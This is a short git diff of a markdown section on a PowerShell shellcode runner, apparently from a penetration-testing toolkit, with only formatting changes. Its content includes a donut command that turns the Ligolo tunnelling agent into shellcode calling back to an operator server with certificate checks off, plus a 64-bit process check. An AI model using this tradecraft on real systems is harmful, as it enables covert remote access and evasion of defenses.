@@ -1,8 +1,10 @@
 ## Powershell Shellcode Runner 
-Make sure to convert agent.exe of ligolo to shellcode:
+Make sure to convert `agent.exe` of Ligolo to shellcode:
 - `donut -f 1 -o agent.bin -a 2 -p "-connect your-server:11601 -ignore-cert" -i agent.exe`
 
-Make sure you are running as x64 bit process before running: Powershell:
+Make sure you are running as x64 bit process before running: 
+
+Powershell:
 - `[Environment]::Is64BitProcess`
 
 CMD: 
